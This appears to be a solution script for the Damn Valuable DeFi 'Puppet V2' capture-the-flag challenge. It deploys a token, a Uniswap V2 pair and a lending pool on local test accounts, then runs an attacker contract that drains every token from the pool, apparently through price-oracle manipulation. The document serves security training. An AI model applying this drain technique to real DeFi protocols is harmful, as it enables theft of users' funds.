from ape import accounts, project
from ..utils.helper import w3, set_balance, get_timestamp, ZERO_ADDRESS

# Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
UNISWAP_INITIAL_TOKEN_RESERVE = w3.to_wei(100, "ether")
UNISWAP_INITIAL_WETH_RESERVE = w3.to_wei(10, "ether")

ATTACKER_INITIAL_TOKEN_BALANCE = w3.to_wei(10000, "ether")
ATTACKER_INITIAL_ETH_BALANCE = w3.to_wei(20, "ether")

POOL_INITIAL_TOKEN_BALANCE = w3.to_wei(1000000, "ether")


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # get accounts
    deployer = accounts.test_accounts[0]
    attacker = accounts.test_accounts[1]
    print(
        f"\n--- \nOur players:\n⇒ Deployer: {deployer}\n⇒ Attacker: {attacker}\n---\n"
    )

    # set attacker to have a balance of 20 ether
    print("\n--- Setting initial balance of attacker to 20 ether ---\n")
    set_balance(attacker, ATTACKER_INITIAL_ETH_BALANCE)
    assert attacker.balance == ATTACKER_INITIAL_ETH_BALANCE

    # Deploy tokens to be traded
    print("\n--- Deploying Token Pair ---\n")
    token = project.DamnValuableToken.deploy(sender=deployer)
    weth = project.WETH9.deploy(sender=deployer)

    # Deploy Uniswap Factory and Router
    print("\n--- Deploying Uniswap Factory and Router ---\n")
    uni_factory = project.UniswapV2Factory.deploy(ZERO_ADDRESS, sender=deployer)
    uni_router = project.UniswapV2Router02.deploy(uni_factory, weth, sender=deployer)

    # Create a Uniswap V2 Pair against WETH and add liquidity
    print("\n--- Creating a Pair against WETH and adding Liquidity ---\n")
    token.approve(uni_router, UNISWAP_INITIAL_TOKEN_RESERVE, sender=deployer)
    uni_router.addLiquidityETH(
        token,
        UNISWAP_INITIAL_TOKEN_RESERVE,
        0,
        0,
        deployer,
        get_timestamp() * 2,
        value=UNISWAP_INITIAL_WETH_RESERVE,
        sender=deployer,
    )

    uni_pair = project.UniswapV2Pair.at(uni_factory.getPair(token, weth))
    assert uni_pair.balanceOf(deployer) > 0

    # Deploy the lending pool
    print("\n--- Deploying the lending pool ---\n")
    lending_pool = project.PuppetV2Pool.deploy(
        weth,
        token,
        uni_pair,
        uni_factory,
        sender=deployer,
    )

    # set up initial token balances of attacker and pool
    token.transfer(attacker, ATTACKER_INITIAL_TOKEN_BALANCE, sender=deployer)
    token.transfer(lending_pool, POOL_INITIAL_TOKEN_BALANCE, sender=deployer)

    # ensure correct set up of pool
    print("\n--- Testing to see if pool is configured correctly... ---\n")

    assert lending_pool.calculateDepositOfWETHRequired(
        w3.to_wei(1, "ether")
    ) == w3.to_wei(0.3, "ether")

    assert lending_pool.calculateDepositOfWETHRequired(
        POOL_INITIAL_TOKEN_BALANCE
    ) == w3.to_wei(300000, "ether")

    pool_initial_bal = token.balanceOf(lending_pool) / 10**18
    attacker_initial_bal = token.balanceOf(attacker) / 10**18

    print(
        f"\n--- \nInitial Balances:\n⇒ Pool: {pool_initial_bal}\n⇒ Attacker: {attacker_initial_bal}\n---\n"
    )

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    attacker_contract = project.PuppetV2Attacker.deploy(
        token,
        uni_router,
        lending_pool,
        weth,
        sender=attacker,
        value="19.9 ether",
    )

    token.transfer(
        attacker_contract,
        token.balanceOf(attacker),
        sender=attacker,
    )

    attacker_contract.attack(sender=attacker)

    # --- AFTER EXPLOIT --- #
    print("\n--- After exploit: Attacker has stolen all the tokens in the pool ---\n")

    pool_ending_bal = token.balanceOf(lending_pool) / 10**18
    attacker_ending_bal = token.balanceOf(attacker) / 10**18

    print(
        f"\n--- \nEnding Balances:\n⇒ Pool: {pool_ending_bal}\n⇒ Attacker: {attacker_ending_bal}\n---\n"
    )

    assert token.balanceOf(lending_pool) == 0
    assert token.balanceOf(attacker) >= POOL_INITIAL_TOKEN_BALANCE

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
